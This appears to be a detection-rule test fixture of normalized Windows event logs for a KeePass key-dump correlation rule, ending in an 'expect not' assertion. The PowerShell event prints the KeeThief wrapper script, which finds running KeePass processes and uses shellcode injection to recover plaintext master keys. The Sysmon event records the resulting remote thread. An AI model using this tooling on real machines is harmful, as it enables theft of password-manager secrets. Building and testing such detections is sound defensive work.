{"action": "execute", "body": "{\"Event\":{\"xmlns\":\"http://schemas.microsoft.com/win/2004/08/events/event\",\"System\":{\"Provider\":{\"Name\":\"Microsoft-Windows-PowerShell\",\"Guid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\"},\"EventID\":\"4104\",\"Version\":\"1\",\"Level\":\"3\",\"Task\":\"2\",\"Opcode\":\"15\",\"Keywords\":\"0x0\",\"TimeCreated\":{\"SystemTime\":\"2019-04-27T18:55:02.7106082Z\"},\"EventRecordID\":\"273644\",\"Correlation\":{\"ActivityID\":\"{83cf053f-9302-0000-d6c4-7b840293d901}\"},\"Execution\":{\"ProcessID\":\"7064\",\"ThreadID\":\"5708\"},\"Channel\":\"Microsoft-Windows-PowerShell/Operational\",\"Computer\":\"IEWIN7\",\"Security\":{\"UserID\":\"S-1-5-18\"}},\"EventData\":{\"Data\":[{\"text\":\"1\",\"Name\":\"MessageNumber\"},{\"text\":\"1\",\"Name\":\"MessageTotal\"},{\"text\":\"# requires -version 2\\n\\nfunction Get-KeePassDatabaseKey {\\n<# \\n    .SYNOPSIS\\n        \\n        Retrieves database mastey key information for unlocked KeePass database.\\n\\n        Function: Get-KeePassDatabaseKey\\n        Author: Lee Christensen (@tifkin_), Will Schroeder (@harmj0y)\\n        License: BSD 3-Clause\\n        Required Dependencies: None\\n        Optional Dependencies: None\\n\\n    .DESCRIPTION\\n        \\n        Enumerates any KeePass 2.X (.NET) processes currently open, or takes a process object on the pipeline.\\n        Loades the C# KeeTheft assembly into memory and for each open KeePass process executes the GetKeePassMasterKeys()\\n        method on it. GetKeePassMasterKeys() will attach to the target KeePass process using CLR MD and enumerate\\n        all CLR heap objects, searching for a KeePassLib.PwDatabase object. If one is found, the path is extracted\\n        from the m_strUrl field, and all referenced objects are enumerated, searching for a KeePassLib.Keys.CompositeKey.\\n        If a composite master key is found, information for each key type (KcpPassword, KcpKeyFile, KcpUserAccount)\\n        is extracted, including the DPAPI encrypted data blobs of key data. For any encrypted blobs found, shellcode\\n        is injected into the KeePass process that calls MyRtlDecryptMemory() to decrypt the DPAPI memory blobs,\\n        returning the plaintext/unprotected key data.\\n\\n    .PARAMETER Process\\n\\n        Optional KeePass process object to pass in on the pipeline.\\n\\n    .EXAMPLE\\n\\n        PS C:\\\\> Get-KeePassDatabaseKey -Verbose\\n        VERBOSE: Examining KeePass process 4184 for master keys\\n\\n\\n        Database             : C:\\\\Users\\\\harmj0y.TESTLAB\\\\Desktop\\\\keepass\\\\NewDatabase.kdbx\\n        KeyType              : KcpUserAccount\\n        KeePassVersion       : 2.34.0.0\\n        ProcessID            : 4184\\n        ExecutablePath       : C:\\\\Users\\\\harmj0y.TESTLAB\\\\Desktop\\\\keepass\\\\KeePass-2.34\\\\KeePass.exe\\n        EncryptedBlobAddress : 49045328\\n        EncryptedBlob        : {113, 148, 127, 29...}\\n        EncryptedBlobLen     : 64\\n        PlaintextBlob        : {120, 181, 162, 116...}\\n        Plaintext            : eLWidCSt...\\n        KeyFilePath          : C:\\\\Users\\\\harmj0y.TESTLAB\\\\AppData\\\\Roaming\\\\KeePass\\\\ProtectedUserKey.bin\\n\\n        Database             : C:\\\\Users\\\\harmj0y.TESTLAB\\\\Desktop\\\\keepass\\\\NewDatabase.kdbx\\n        KeyType              : KcpKeyFile\\n        KeePassVersion       : 2.34.0.0\\n        ProcessID            : 4184\\n        ExecutablePath       : C:\\\\Users\\\\harmj0y.TESTLAB\\\\Desktop\\\\keepass\\\\KeePass-2.34\\\\KeePass.exe\\n        EncryptedBlobAddress : 49037240\\n        EncryptedBlob        : {137, 185, 6, 97...}\\n        EncryptedBlobLen     : 32\\n        PlaintextBlob        : {177, 5, 150, 205...}\\n        Plaintext            : sQWWzdcT...\\n        KeyFilePath          : C:\\\\Users\\\\harmj0y.TESTLAB\\\\Documents\\\\s.license\\n\\n        Database             : C:\\\\Users\\\\harmj0y.TESTLAB\\\\Desktop\\\\keepass\\\\NewDatabase.kdbx\\n        KeyType              : KcpPassword\\n        KeePassVersion       : 2.34.0.0\\n        ProcessID            : 4184\\n        ExecutablePath       : C:\\\\Users\\\\harmj0y.TESTLAB\\\\Desktop\\\\keepass\\\\KeePass-2.34\\\\KeePass.exe\\n        EncryptedBlobAddress : 48920376\\n        EncryptedBlob        : {228, 78, 75, 16...}\\n        EncryptedBlobLen     : 16\\n        PlaintextBlob        : {80, 97, 115, 115...}\\n        Plaintext            : Password123!\\n        KeyFilePath          :\\n\\n    .EXAMPLE\\n\\n        PS C:\\\\> Get-Process KeePass | Get-KeePassDatabaseKey -Verbose\\n        VERBOSE: Examining KeePass process 4184 for master keys\\n\\n\\n        Database             : C:\\\\Users\\\\harmj0y.TESTLAB\\\\Desktop\\\\keepass\\\\NewDatabase.kdbx\\n        KeyType              : KcpUserAccount\\n        ....\\n# >\\n    [CmdletBinding()] \\n    param (\\n        [Parameter(Position = 0, ValueFromPipeline = $True)]\\n        [System.Diagnostics.Process[]]\\n        [ValidateNotNullOrEmpty()]\\n        $Process\\n    )\\n    \\n    BEGIN {\\n        if(-not $PSBoundParameters['Process']) {\\n            try {\\n                $Process = Get-Process KeePass -ErrorAction Stop | Where-Object {$_.FileVersion -match '^2\\\\.'}\\n            }\\n            catch {\\n                throw 'No KeePass 2.X instances open!'\\n            }\\n        }\\n\\n        # load file off of disk instead\\n        # $Assembly = [Reflection.Assembly]::LoadFile((Get-Item -Path .\\\\ReleaseKeePass.exe).FullName)\\n\\n        # the KeyTheft assembly, generated with \\\"Out-CompressedDll -FilePath .\\\\ReleaseKeePass.exe | Out-File -Encoding ASCII .\\\\compressed.ps1\\\"\\n\\n    }\\n\\n    PROCESS {\\n\\n        ForEach($KeePassProcess in $Process) {\\n\\n            if($KeePassProcess.FileVersion -match '^2\\\\.') {\\n\\n                $WMIProcess = Get-WmiObject win32_process -Filter \\\"ProcessID = $($KeePassProcess.ID)\\\"\\n                $ExecutablePath = $WMIProcess | Select-Object -Expand ExecutablePath\\n\\n                Write-Verbose \\\"Examining KeePass process $($KeePassProcess.ID) for master keys\\\"\\n\\n                $Keys = $Assembly.GetType('KeeTheft.Program').GetMethod('GetKeePassMasterKeys').Invoke($null, @([System.Diagnostics.Process]$KeePassProcess))\\n\\n                if($Keys) {\\n\\n                    ForEach ($Key in $Keys) {\\n\\n                        ForEach($UserKey in $Key.UserKeys) {\\n\\n                            $KeyType = $UserKey.GetType().Name\\n\\n                            $UserKeyObject = New-Object PSObject\\n                            $UserKeyObject | Add-Member Noteproperty 'Database' $UserKey.databaseLocation\\n                            $UserKeyObject | Add-Member Noteproperty 'KeyType' $KeyType\\n                            $UserKeyObject | Add-Member Noteproperty 'KeePassVersion' $KeePassProcess.FileVersion\\n                            $UserKeyObject | Add-Member Noteproperty 'ProcessID' $KeePassProcess.ID\\n                            $UserKeyObject | Add-Member Noteproperty 'ExecutablePath' $ExecutablePath\\n                            $UserKeyObject | Add-Member Noteproperty 'EncryptedBlobAddress' $UserKey.encryptedBlobAddress\\n                            $UserKeyObject | Add-Member Noteproperty 'EncryptedBlob' $UserKey.encryptedBlob\\n                            $UserKeyObject | Add-Member Noteproperty 'EncryptedBlobLen' $UserKey.encryptedBlobLen\\n                            $UserKeyObject | Add-Member Noteproperty 'PlaintextBlob' $UserKey.plaintextBlob\\n\\n                            if($KeyType -eq 'KcpPassword') {\\n                                $Plaintext = [System.Text.Encoding]::UTF8.GetString($UserKey.plaintextBlob)\\n                            }\\n                            else {\\n                                $Plaintext = [Convert]::ToBase64String($UserKey.plaintextBlob)\\n                            }\\n\\n                            $UserKeyObject | Add-Member Noteproperty 'Plaintext' $Plaintext\\n\\n                            if($KeyType -eq 'KcpUserAccount') {\\n                                try {\\n                                    $WMIProcess = Get-WmiObject win32_process -Filter \\\"ProcessID = $($KeePassProcess.ID)\\\"\\n                                    $UserName = $WMIProcess.GetOwner().User\\n\\n                                    $ProtectedUserKeyPath = Resolve-Path -Path \\\"$($Env:WinDir | Split-Path -Qualifier)\\\\Users\\\\*$UserName*\\\\AppData\\\\Roaming\\\\KeePass\\\\ProtectedUserKey.bin\\\" -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Path\\n\\n                                    $UserKeyObject | Add-Member Noteproperty 'KeyFilePath' $ProtectedUserKeyPath\\n\\n                                }\\n                                catch {\\n                                    Write-Warning \\\"Error enumerating the owner of $($KeePassProcess.ID) : $_\\\"\\n                                }\\n                            }\\n                            else {\\n                                $UserKeyObject | Add-Member Noteproperty 'KeyFilePath' $UserKey.keyFilePath\\n                            }\\n\\n                            $UserKeyObject.PSObject.TypeNames.Insert(0, 'KeePass.Keys')\\n                            $UserKeyObject\\n                        }\\n                    }\\n                }\\n                else {\\n                    Write-Verbose \\\"No keys found for $($KeePassProcess.ID)\\\"\\n                }\\n            }\\n            else {\\n                Write-Warning \\\"Only KeePass 2.X is supported at this time.\\\"\\n            }\\n        }\\n    }\\n}\\n\",\"Name\":\"ScriptBlockText\"},{\"text\":\"d4643a9b-6f64-4fbc-95e8-c2524689590f\",\"Name\":\"ScriptBlockId\"},{\"text\":\"C:\\\\Users\\\\Administrator\\\\Downloads\\\\KeeThief_test\\\\KeeThief-master\\\\KeeTheft\\\\KeeTheft\\\\KeeThief.ps1\",\"Name\":\"Path\"}]}}}", "category.generic": "Command", "category.high": "System Management", "category.low": "Manipulation", "event_src.category": "Operating system", "event_src.fqdn": "iewin7", "event_src.host": "iewin7", "event_src.hostname": "iewin7", "event_src.subsys": "Microsoft-Windows-PowerShell/Operational", "event_src.title": "windows", "event_src.vendor": "microsoft", "generator.type": "logcollector", "generator.version": "N26.0.2936", "id": "PT_Microsoft_Windows_eventlog_Common_PowerShell_4104_Command_executed", "importance": "info", "input_id": "00000000-0000-0000-0000-000000000000", "mime": "application/x-pt-eventlog", "msgid": "4104", "normalized": true, "numfield1": 1, "numfield2": 1, "object": "command", "object.account.id": "S-1-5-18", "object.fullpath": "C:\\Users\\Administrator\\Downloads\\KeeThief_test\\KeeThief-master\\KeeTheft\\KeeTheft\\KeeThief.ps1", "object.id": "d4643a9b-6f64-4fbc-95e8-c2524689590f", "object.name": "KeeThief.ps1", "object.path": "C:\\Users\\Administrator\\Downloads\\KeeThief_test\\KeeThief-master\\KeeTheft\\KeeTheft\\", "object.process.cmdline": "# requires -version 2function Get-KeePassDatabaseKey {<#    .SYNOPSIS                Retrieves database mastey key information for unlocked KeePass database.        Function: Get-KeePassDatabaseKey        Author: Lee Christensen (@tifkin_), Will Schroeder (@harmj0y)        License: BSD 3-Clause        Required Dependencies: None        Optional Dependencies: None    .DESCRIPTION                Enumerates any KeePass 2.X (.NET) processes currently open, or takes a process object on the pipeline.        Loades the C# KeeTheft assembly into memory and for each open KeePass process executes the GetKeePassMasterKeys()        method on it. GetKeePassMasterKeys() will attach to the target KeePass process using CLR MD and enumerate        all CLR heap objects, searching for a KeePassLib.PwDatabase object. If one is found, the path is extracted        from the m_strUrl field, and all referenced objects are enumerated, searching for a KeePassLib.Keys.CompositeKey.        If a composite master key is found, information for each key type (KcpPassword, KcpKeyFile, KcpUserAccount)        is extracted, including the DPAPI encrypted data blobs of key data. For any encrypted blobs found, shellcode        is injected into the KeePass process that calls MyRtlDecryptMemory() to decrypt the DPAPI memory blobs,        returning the plaintext/unprotected key data.    .PARAMETER Process        Optional KeePass process object to pass in on the pipeline.    .EXAMPLE        PS C:\\> Get-KeePassDatabaseKey -Verbose        VERBOSE: Examining KeePass process 4184 for master keys        Database             : C:\\Users\\harmj0y.TESTLAB\\Desktop\\keepass\\NewDatabase.kdbx        KeyType              : KcpUserAccount        KeePassVersion       : 2.34.0.0        ProcessID            : 4184        ExecutablePath       : C:\\Users\\harmj0y.TESTLAB\\Desktop\\keepass\\KeePass-2.34\\KeePass.exe        EncryptedBlobAddress : 49045328        EncryptedBlob        : {113, 148, 127, 29...}        EncryptedBlobLen     : 64        PlaintextBlob        : {120, 181, 162, 116...}        Plaintext            : eLWidCSt...        KeyFilePath          : C:\\Users\\harmj0y.TESTLAB\\AppData\\Roaming\\KeePass\\ProtectedUserKey.bin        Database             : C:\\Users\\harmj0y.TESTLAB\\Desktop\\keepass\\NewDatabase.kdbx        KeyType              : KcpKeyFile        KeePassVersion       : 2.34.0.0        ProcessID            : 4184        ExecutablePath       : C:\\Users\\harmj0y.TESTLAB\\Desktop\\keepass\\KeePass-2.34\\KeePass.exe        EncryptedBlobAddress : 49037240        EncryptedBlob        : {137, 185, 6, 97...}        EncryptedBlobLen     : 32        PlaintextBlob        : {177, 5, 150, 205...}        Plaintext            : sQWWzdcT...        KeyFilePath          : C:\\Users\\harmj0y.TESTLAB\\Documents\\s.license        Database             : C:\\Users\\harmj0y.TESTLAB\\Desktop\\keepass\\NewDatabase.kdbx        KeyType              : KcpPassword        KeePassVersion       : 2.34.0.0        ProcessID            : 4184        ExecutablePath       : C:\\Users\\harmj0y.TESTLAB\\Desktop\\keepass\\KeePass-2.34\\KeePass.exe        EncryptedBlobAddress : 48920376        EncryptedBlob        : {228, 78, 75, 16...}        EncryptedBlobLen     : 16        PlaintextBlob        : {80, 97, 115, 115...}        Plaintext            : Password123!        KeyFilePath          :    .EXAMPLE        PS C:\\> Get-Process KeePass | Get-KeePassDatabaseKey -Verbose        VERBOSE: Examining KeePass process 4184 for master keys        Database             : C:\\Users\\harmj0y.TESTLAB\\Desktop\\keepass\\NewDatabase.kdbx        KeyType              : KcpUserAccount        ....# >    [CmdletBinding()]     param (        [Parameter(Position = 0, ValueFromPipeline = $True)]        [System.Diagnostics.Process[]]        [ValidateNotNullOrEmpty()]        $Process    )        BEGIN {        if(-not $PSBoundParameters['Process']) {            try {                $Process = Get-Process KeePass -ErrorAction Stop | Where-Object {$_.FileVersion -match '^2\\.'}            }            catch {                throw 'No KeePass 2.X instances open!'            }        }        # load file off of disk instead        # $Assembly = [Reflection.Assembly]::LoadFile((Get-Item -Path .\\ReleaseKeePass.exe).FullName)        # the KeyTheft assembly, generated with \"Out-CompressedDll -FilePath .\\ReleaseKeePass.exe | Out-File -Encoding ASCII .\\compressed.ps1\"    }    PROCESS {        ForEach($KeePassProcess in $Process) {            if($KeePassProcess.FileVersion -match '^2\\.') {                $WMIProcess = Get-WmiObject win32_process -Filter \"ProcessID = $($KeePassProcess.ID)\"                $ExecutablePath = $WMIProcess | Select-Object -Expand ExecutablePath                Write-Verbose \"Examining KeePass process $($KeePassProcess.ID) for master keys\"                $Keys = $Assembly.GetType('KeeTheft.Program').GetMethod('AnotherMethod').Invoke($null, @([System.Diagnostics.Process]$KeePassProcess))                if($Keys) {                    ForEach ($Key in $Keys) {                        ForEach($UserKey in $Key.UserKeys) {                            $KeyType = $UserKey.GetType().Name                            $UserKeyObject = New-Object PSObject                            $UserKeyObject | Add-Member Noteproperty 'Database' $UserKey.databaseLocation                            $UserKeyObject | Add-Member Noteproperty 'KeyType' $KeyType                            $UserKeyObject | Add-Member Noteproperty 'KeePassVersion' $KeePassProcess.FileVersion                            $UserKeyObject | Add-Member Noteproperty 'ProcessID' $KeePassProcess.ID                            $UserKeyObject | Add-Member Noteproperty 'ExecutablePath' $ExecutablePath                            $UserKeyObject | Add-Member Noteproperty 'EncryptedBlobAddress' $UserKey.encryptedBlobAddress                            $UserKeyObject | Add-Member Noteproperty 'EncryptedBlob' $UserKey.encryptedBlob                            $UserKeyObject | Add-Member Noteproperty 'EncryptedBlobLen' $UserKey.encryptedBlobLen                            $UserKeyObject | Add-Member Noteproperty 'PlaintextBlob' $UserKey.plaintextBlob                            if($KeyType -eq 'KcpPassword') {                                $Plaintext = [System.Text.Encoding]::UTF8.GetString($UserKey.plaintextBlob)                            }                            else {                                $Plaintext = [Convert]::ToBase64String($UserKey.plaintextBlob)                            }                            $UserKeyObject | Add-Member Noteproperty 'Plaintext' $Plaintext                            if($KeyType -eq 'KcpUserAccount') {                                try {                                    $WMIProcess = Get-WmiObject win32_process -Filter \"ProcessID = $($KeePassProcess.ID)\"                                    $UserName = $WMIProcess.GetOwner().User                                    $ProtectedUserKeyPath = Resolve-Path -Path \"$($Env:WinDir | Split-Path -Qualifier)\\Users\\*$UserName*\\AppData\\Roaming\\KeePass\\ProtectedUserKey.bin\" -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Path                                    $UserKeyObject | Add-Member Noteproperty 'KeyFilePath' $ProtectedUserKeyPath                                }                                catch {                                    Write-Warning \"Error enumerating the owner of $($KeePassProcess.ID) : $_\"                                }                            }                            else {                                $UserKeyObject | Add-Member Noteproperty 'KeyFilePath' $UserKey.keyFilePath                            }                            $UserKeyObject.PSObject.TypeNames.Insert(0, 'KeePass.Keys')                            $UserKeyObject                        }                    }                }                else {                    Write-Verbose \"No keys found for $($KeePassProcess.ID)\"                }            }            else {                Write-Warning \"Only KeePass 2.X is supported at this time.\"            }        }    }}", "object.process.id": "7064", "object.value": "# requires -version 2function Get-KeePassDatabaseKey {<#    .SYNOPSIS                Retrieves database mastey key information for unlocked KeePass database.        Function: Get-KeePassDatabaseKey        Author: Lee Christensen (@tifkin_), Will Schroeder (@harmj0y)        License: BSD 3-Clause        Required Dependencies: None        Optional Dependencies: None    .DESCRIPTION                Enumerates any KeePass 2.X (.NET) processes currently open, or takes a process object on the pipeline.        Loades the C# KeeTheft assembly into memory and for each open KeePass process executes the GetKeePassMasterKeys()        method on it. GetKeePassMasterKeys() will attach to the target KeePass process using CLR MD and enumerate        all CLR heap objects, searching for a KeePassLib.PwDatabase object. If one is found, the path is extracted        from the m_strUrl field, and all referenced objects are enumerated, searching for a KeePassLib.Keys.CompositeKey.        If a composite master key is found, information for each key type (KcpPassword, KcpKeyFile, KcpUserAccount)        is extracted, including the DPAPI encrypted data blobs of key data. For any encrypted blobs found, shellcode        is injected into the KeePass process that calls MyRtlDecryptMemory() to decrypt the DPAPI memory blobs,        returning the plaintext/unprotected key data.    .PARAMETER Process        Optional KeePass process object to pass in on the pipeline.    .EXAMPLE        PS C:\\> Get-KeePassDatabaseKey -Verbose        VERBOSE: Examining KeePass process 4184 for master keys        Database             : C:\\Users\\harmj0y.TESTLAB\\Desktop\\keepass\\NewDatabase.kdbx        KeyType              : KcpUserAccount        KeePassVersion       : 2.34.0.0        ProcessID            : 4184        ExecutablePath       : C:\\Users\\harmj0y.TESTLAB\\Desktop\\keepass\\KeePass-2.34\\KeePass.exe        EncryptedBlobAddress : 49045328        EncryptedBlob        : {113, 148, 127, 29...}        EncryptedBlobLen     : 64        PlaintextBlob        : {120, 181, 162, 116...}        Plaintext            : eLWidCSt...        KeyFilePath          : C:\\Users\\harmj0y.TESTLAB\\AppData\\Roaming\\KeePass\\ProtectedUserKey.bin        Database             : C:\\Users\\harmj0y.TESTLAB\\Desktop\\keepass\\NewDatabase.kdbx        KeyType              : KcpKeyFile        KeePassVersion       : 2.34.0.0        ProcessID            : 4184        ExecutablePath       : C:\\Users\\harmj0y.TESTLAB\\Desktop\\keepass\\KeePass-2.34\\KeePass.exe        EncryptedBlobAddress : 49037240        EncryptedBlob        : {137, 185, 6, 97...}        EncryptedBlobLen     : 32        PlaintextBlob        : {177, 5, 150, 205...}        Plaintext            : sQWWzdcT...        KeyFilePath          : C:\\Users\\harmj0y.TESTLAB\\Documents\\s.license        Database             : C:\\Users\\harmj0y.TESTLAB\\Desktop\\keepass\\NewDatabase.kdbx        KeyType              : KcpPassword        KeePassVersion       : 2.34.0.0        ProcessID            : 4184        ExecutablePath       : C:\\Users\\harmj0y.TESTLAB\\Desktop\\keepass\\KeePass-2.34\\KeePass.exe        EncryptedBlobAddress : 48920376        EncryptedBlob        : {228, 78, 75, 16...}        EncryptedBlobLen     : 16        PlaintextBlob        : {80, 97, 115, 115...}        Plaintext            : Password123!        KeyFilePath          :    .EXAMPLE        PS C:\\> Get-Process KeePass | Get-KeePassDatabaseKey -Verbose        VERBOSE: Examining KeePass process 4184 for master keys        Database             : C:\\Users\\harmj0y.TESTLAB\\Desktop\\keepass\\NewDatabase.kdbx        KeyType              : KcpUserAccount        ....# >    [CmdletBinding()]     param (        [Parameter(Position = 0, ValueFromPipeline = $True)]        [System.Diagnostics.Process[]]        [ValidateNotNullOrEmpty()]        $Process    )        BEGIN {        if(-not $PSBoundParameters['Process']) {            try {                $Process = Get-Process KeePass -ErrorAction Stop | Where-Object {$_.FileVersion -match '^2\\.'}            }            catch {                throw 'No KeePass 2.X instances open!'            }        }        # load file off of disk instead        # $Assembly = [Reflection.Assembly]::LoadFile((Get-Item -Path .\\ReleaseKeePass.exe).FullName)        # the KeyTheft assembly, generated with \"Out-CompressedDll -FilePath .\\ReleaseKeePass.exe | Out-File -Encoding ASCII .\\compressed.ps1\"    }    PROCESS {        ForEach($KeePassProcess in $Process) {            if($KeePassProcess.FileVersion -match '^2\\.') {                $WMIProcess = Get-WmiObject win32_process -Filter \"ProcessID = $($KeePassProcess.ID)\"                $ExecutablePath = $WMIProcess | Select-Object -Expand ExecutablePath                Write-Verbose \"Examining KeePass process $($KeePassProcess.ID) for master keys\"                $Keys = $Assembly.GetType('KeeTheft.Program').GetMethod('AnotherMethod').Invoke($null, @([System.Diagnostics.Process]$KeePassProcess))                if($Keys) {                    ForEach ($Key in $Keys) {                        ForEach($UserKey in $Key.UserKeys) {                            $KeyType = $UserKey.GetType().Name                            $UserKeyObject = New-Object PSObject                            $UserKeyObject | Add-Member Noteproperty 'Database' $UserKey.databaseLocation                            $UserKeyObject | Add-Member Noteproperty 'KeyType' $KeyType                            $UserKeyObject | Add-Member Noteproperty 'KeePassVersion' $KeePassProcess.FileVersion                            $UserKeyObject | Add-Member Noteproperty 'ProcessID' $KeePassProcess.ID                            $UserKeyObject | Add-Member Noteproperty 'ExecutablePath' $ExecutablePath                            $UserKeyObject | Add-Member Noteproperty 'EncryptedBlobAddress' $UserKey.encryptedBlobAddress                            $UserKeyObject | Add-Member Noteproperty 'EncryptedBlob' $UserKey.encryptedBlob                            $UserKeyObject | Add-Member Noteproperty 'EncryptedBlobLen' $UserKey.encryptedBlobLen                            $UserKeyObject | Add-Member Noteproperty 'PlaintextBlob' $UserKey.plaintextBlob                            if($KeyType -eq 'KcpPassword') {                                $Plaintext = [System.Text.Encoding]::UTF8.GetString($UserKey.plaintextBlob)                            }                            else {                                $Plaintext = [Convert]::ToBase64String($UserKey.plaintextBlob)                            }                            $UserKeyObject | Add-Member Noteproperty 'Plaintext' $Plaintext                            if($KeyType -eq 'KcpUserAccount') {                                try {                                    $WMIProcess = Get-WmiObject win32_process -Filter \"ProcessID = $($KeePassProcess.ID)\"                                    $UserName = $WMIProcess.GetOwner().User                                    $ProtectedUserKeyPath = Resolve-Path -Path \"$($Env:WinDir | Split-Path -Qualifier)\\Users\\*$UserName*\\AppData\\Roaming\\KeePass\\ProtectedUserKey.bin\" -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Path                                    $UserKeyObject | Add-Member Noteproperty 'KeyFilePath' $ProtectedUserKeyPath                                }                                catch {                                    Write-Warning \"Error enumerating the owner of $($KeePassProcess.ID) : $_\"                                }                            }                            else {                                $UserKeyObject | Add-Member Noteproperty 'KeyFilePath' $UserKey.keyFilePath                            }                            $UserKeyObject.PSObject.TypeNames.Insert(0, 'KeePass.Keys')                            $UserKeyObject                        }                    }                }                else {                    Write-Verbose \"No keys found for $($KeePassProcess.ID)\"                }            }            else {                Write-Warning \"Only KeePass 2.X is supported at this time.\"            }        }    }}", "recv_ipv4": "127.0.0.1", "recv_time": "2023-06-06T11:33:47.757Z", "status": "success", "subject": "account", "subject.account.id": "S-1-5-18", "tag": "some_tag", "task_id": "00000000-0000-0000-0000-000000000000", "taxonomy_version": "26.0.215-release-26.0", "time": "2019-04-27T18:55:02.710Z", "type": "raw", "uuid": "3e774e05-1f1a-4b58-812a-3127158afc3a"}
{"action": "start", "body": "{\"Event\":{\"xmlns\":\"http://schemas.microsoft.com/win/2004/08/events/event\",\"System\":{\"Provider\":{\"Name\":\"Microsoft-Windows-Sysmon\",\"Guid\":\"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}\"},\"EventID\":\"8\",\"Version\":\"2\",\"Level\":\"4\",\"Task\":\"8\",\"Opcode\":\"0\",\"Keywords\":\"0x8000000000000000\",\"TimeCreated\":{\"SystemTime\":\"2019-04-27T18:55:04.9801378Z\"},\"EventRecordID\":\"7071\",\"Correlation\":\"\",\"Execution\":{\"ProcessID\":\"1816\",\"ThreadID\":\"1228\"},\"Channel\":\"Microsoft-Windows-Sysmon/Operational\",\"Computer\":\"IEWIN7\",\"Security\":{\"UserID\":\"S-1-5-18\"}},\"EventData\":{\"Data\":[{\"Name\":\"RuleName\"},{\"Name\":\"UtcTime\",\"text\":\"2019-04-27 18:55:04.980\"},{\"Name\":\"SourceProcessGuid\",\"text\":\"{365abb72-a512-5cc4-0000-0010c05e1b00}\"},{\"Name\":\"SourceProcessId\",\"text\":\"2856\"},{\"Name\":\"SourceImage\",\"text\":\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\"},{\"Name\":\"TargetProcessGuid\",\"text\":\"{365abb72-a201-5cc4-0000-00104f500800}\"},{\"Name\":\"TargetProcessId\",\"text\":\"2364\"},{\"Name\":\"TargetImage\",\"text\":\"C:\\\\Program Files\\\\KeePass Password Safe 2\\\\KeePass.exe\"},{\"Name\":\"NewThreadId\",\"text\":\"1384\"},{\"Name\":\"StartAddress\",\"text\":\"0x06160000\"},{\"Name\":\"StartModule\"},{\"Name\":\"StartFunction\"}]}}}", "category.generic": "Thread", "category.high": "Availability Management", "category.low": "Control", "datafield6": "0x06160000", "event_src.category": "Other", "event_src.fqdn": "iewin7", "event_src.host": "iewin7", "event_src.hostname": "iewin7", "event_src.subsys": "Microsoft-Windows-Sysmon/Operational", "event_src.title": "sysmon", "event_src.vendor": "microsoft", "generator.type": "logcollector", "generator.version": "N26.0.2936", "id": "PT_Microsoft_Windows_eventlog_Sysmon_8_Create_remote_thread", "importance": "low", "input_id": "00000000-0000-0000-0000-000000000000", "mime": "application/x-pt-eventlog", "msgid": "8", "normalized": true, "object": "thread", "object.id": "1384", "object.process.fullpath": "c:\\program files\\keepass password safe 2\\keepass.exe", "object.process.guid": "365abb72-a201-5cc4-0000-00104f500800", "object.process.id": "2364", "object.process.name": "keepass.exe", "object.process.path": "c:\\program files\\keepass password safe 2\\", "recv_ipv4": "127.0.0.1", "recv_time": "2023-06-06T03:10:10.818Z", "status": "success", "subject": "process", "subject.process.fullpath": "c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe", "subject.process.guid": "365abb72-a512-5cc4-0000-0010c05e1b00", "subject.process.id": "2856", "subject.process.name": "powershell.exe", "subject.process.path": "c:\\windows\\system32\\windowspowershell\\v1.0\\", "tag": "some_tag", "task_id": "00000000-0000-0000-0000-000000000000", "taxonomy_version": "26.0.215-release-26.0", "time": "2019-04-27T18:55:04.980Z", "type": "raw", "uuid": "d26cbfcd-61bb-4a46-83a3-3a1379d98dbc"}

expect not {"correlation_name": "Keepass_Key_Dump_Via_KeeThief"}
